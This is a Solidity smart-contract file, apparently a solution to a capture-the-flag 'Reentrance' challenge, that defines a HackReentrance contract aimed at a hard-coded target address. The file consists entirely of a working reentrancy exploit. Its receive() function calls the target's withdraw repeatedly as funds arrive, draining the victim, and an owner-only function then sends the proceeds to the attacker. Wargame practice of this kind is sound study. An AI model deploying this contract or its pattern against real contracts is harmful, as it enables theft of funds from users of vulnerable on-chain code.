pragma solidity ^0.6.0;

import './Reentrance.sol';

contract HackReentrance {
    address public owner;
    Reentrance public reentrance =
        Reentrance(0xca4d600eb2E542245e5A0147F521375f74160284);

    constructor() public {
        owner = msg.sender;
    }

    function reenter(uint256 _amount) public {
        require(msg.sender == owner, 'Not owner');
        reentrance.withdraw(_amount);
    }

    function withdraw() public {
        require(msg.sender == owner, 'Not owner');
        msg.sender.call{value: address(this).balance}('');
    }

    receive() external payable {
        reentrance.withdraw(msg.value);
    }
}
